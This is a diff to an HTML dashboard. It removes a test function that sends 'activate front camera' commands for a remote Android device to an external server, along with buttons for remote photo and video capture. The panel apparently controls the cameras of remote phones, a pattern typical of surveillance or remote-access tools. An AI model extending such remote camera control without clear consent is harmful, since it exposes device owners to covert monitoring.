@@ -473,65 +473,7 @@
             modal.style.display = 'block';
         }
 
-        // 🛠️ EMERGENCY CAMERA FIX
-        function manualCameraTest() {
-            console.log('🛠️ Manual camera test started...');
-            
-            // Create test device data
-            const testDevice = {
-                device_id: "test_device_manual",
-                device_model: "Samsung Galaxy S21",
-                battery_percent: 65,
-                android_version: "Android 13",
-                created_at: new Date().toISOString()
-            };
-            
-            // Set as current device
-            window.app.currentDevice = testDevice;
-            console.log('📱 Test device set:', testDevice);
-            
-            // Send camera command directly
-            sendCameraCommandDirect('activate', 'front');
-        }
-
-        // Direct camera command function
-        async function sendCameraCommandDirect(action, cameraType) {
-            console.log('📷 Sending direct camera command:', { action, cameraType });
-            
-            try {
-                const payload = {
-                    device_id: "test_device_manual",
-                    device_model: "Samsung Galaxy S21", 
-                    action: action,
-                    camera_type: cameraType
-                };
-                
-                console.log('📷 Payload:', payload);
-                
-                const response = await fetch('https://sukh-3qtl.onrender.com/api/camera', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                console.log('📷 Response status:', response.status);
-                const result = await response.json();
-                console.log('📷 Camera command result:', result);
-                
-                if (result.success) {
-                    alert('✅ SUCCESS: ' + result.message);
-                } else {
-                    alert('❌ FAILED: ' + result.message);
-                }
-            } catch (error) {
-                console.error('❌ Camera command error:', error);
-                alert('💥 NETWORK ERROR: ' + error.message);
-            }
-        }
-
-        // DOM Content Loaded - FIXED EVENT LISTENERS
+        // DOM Content Loaded - FIXED EVENT LISTENERS (NO DUPLICATES)
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🔧 Initializing dashboard event listeners...');
             
@@ -557,71 +499,6 @@
                 }
             }
 
-            // 📸 CAMERA BUTTONS - DIRECT EVENT LISTENERS (FIXED)
-            const frontCameraBtn = document.getElementById('frontCameraBtn');
-            const backCameraBtn = document.getElementById('backCameraBtn');
-            const capturePhotoBtn = document.getElementById('capturePhotoBtn');
-            const recordVideoBtn = document.getElementById('recordVideoBtn');
-
-            console.log('📷 Camera buttons status:', {
-                front: !!frontCameraBtn,
-                back: !!backCameraBtn, 
-                capture: !!capturePhotoBtn,
-                record: !!recordVideoBtn
-            });
-
-            // Front Camera Button
-            if (frontCameraBtn) {
-                frontCameraBtn.addEventListener('click', function() {
-                    console.log('📷 Front camera button CLICKED');
-                    if (window.app && window.app.activateCamera) {
-                        window.app.activateCamera('front');
-                    } else {
-                        console.error('❌ App not loaded or activateCamera not found');
-                        alert('App not properly loaded. Please refresh the page.');
-                    }
-                });
-            }
-
-            // Back Camera Button  
-            if (backCameraBtn) {
-                backCameraBtn.addEventListener('click', function() {
-                    console.log('📷 Back camera button CLICKED');
-                    if (window.app && window.app.activateCamera) {
-                        window.app.activateCamera('back');
-                    } else {
-                        console.error('❌ App not loaded or activateCamera not found');
-                        alert('App not properly loaded. Please refresh the page.');
-                    }
-                });
-            }
-
-            // Capture Photo Button
-            if (capturePhotoBtn) {
-                capturePhotoBtn.addEventListener('click', function() {
-                    console.log('📷 Capture photo button CLICKED');
-                    if (window.app && window.app.capturePhoto) {
-                        window.app.capturePhoto();
-                    } else {
-                        console.error('❌ App not loaded or capturePhoto not found');
-                        alert('App not properly loaded. Please refresh the page.');
-                    }
-                });
-            }
-
-            // Record Video Button
-            if (recordVideoBtn) {
-                recordVideoBtn.addEventListener('click', function() {
-                    console.log('📷 Record video button CLICKED');
-                    if (window.app && window.app.recordVideo) {
-                        window.app.recordVideo();
-                    } else {
-                        console.error('❌ App not loaded or recordVideo not found');
-                        alert('App not properly loaded. Please refresh the page.');
-                    }
-                });
-            }
-
             // Tab functionality
             const tabBtns = document.querySelectorAll('.tab-btn');
             tabBtns.forEach(btn => {
@@ -640,12 +517,8 @@
                 });
             });
 
-            console.log('✅ All event listeners initialized');
+            console.log('✅ All event listeners initialized - Camera buttons handled by app.js');
         });
-
-        // Test function for console
-        window.testCamera = manualCameraTest;
-        console.log('🛠️ Test functions available: testCamera()');
     </script>
 </body>
 </html>
